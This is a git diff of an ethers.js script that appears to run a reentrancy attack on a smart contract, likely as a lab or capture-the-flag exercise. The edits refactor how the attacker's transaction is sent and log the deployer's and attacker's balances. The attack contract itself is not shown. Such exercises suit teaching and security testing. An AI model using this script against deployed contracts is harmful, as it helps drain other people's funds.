@@ -11,7 +11,7 @@ async function main() {
     }
 
     // Get the provider and both signers
-    const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
+    const provider = new ethers.JsonRpcProvider(process.env.HTTPS_RPC_URL);
     const [attacker, deployer] = await ethers.getSigners();
 
     console.log(`Attacker address: ${attacker.address}`);
@@ -54,6 +54,8 @@ async function main() {
     }
 
     // Log the balance of the attacker
+    const deployerBalance = await provider.getBalance(deployer.address);
+    console.log(`Deployer balance: ${ethers.formatEther(deployerBalance)} ETH`);
     const attackerBalance = await provider.getBalance(attacker.address);
     console.log(`Attacker balance: ${ethers.formatEther(attackerBalance)} ETH`);
 
@@ -82,28 +84,30 @@ async function main() {
     // Log the transaction data
     // console.log(`Encoded function data: ${txData}`);
 
-    // Create a transaction object for the attack
+    // Prepare the base transaction
     const tx = {
       to: attackContractAddress,
       value: ethers.parseEther("0.00001"),  // Adjust the value to send with the transaction
-      gasLimit: 3000000,  // Adjust gas limit as needed
-      // maxPriorityFeePerGas: ethers.parseUnits('3', 'gwei'),  // Set the priority fee (tip) per gas unit
-      // maxFeePerGas: ethers.parseUnits('100', 'gwei'),
       data: txData
     };
 
-    // Send the transaction using the attacker signer
-    console.log(`Sending transaction to ${attackContractAddress} with value: 0.001 ETH`);
-    const txResponse = await attacker.sendTransaction(tx);
+    // Populate the transaction
+    const populatedTx = await attacker.populateTransaction(tx);
+
+    // Optionally override some fields
+    populatedTx.gasLimit = 3000000;
+
+    // Send the transaction
+    const txResponse = await attacker.sendTransaction(populatedTx);
 
     // Wait for the transaction to be mined with reentrancy loop handling
-      try {
-        const receipt = await txResponse.wait();
-        console.log("Reentrancy Transaction successful. Transaction hash:", receipt.hash);
-      } catch (error) {
-        console.error(`Transaction failed :`, error);
-      }
+    try {
+      const receipt = await txResponse.wait();
+      console.log("Reentrancy Transaction successful. Transaction hash:", receipt.hash);
     } catch (error) {
+      console.error(`Transaction failed :`, error);
+    }
+  } catch (error) {
     console.error("Transaction failed:", error);
     process.exitCode = 1;
   }
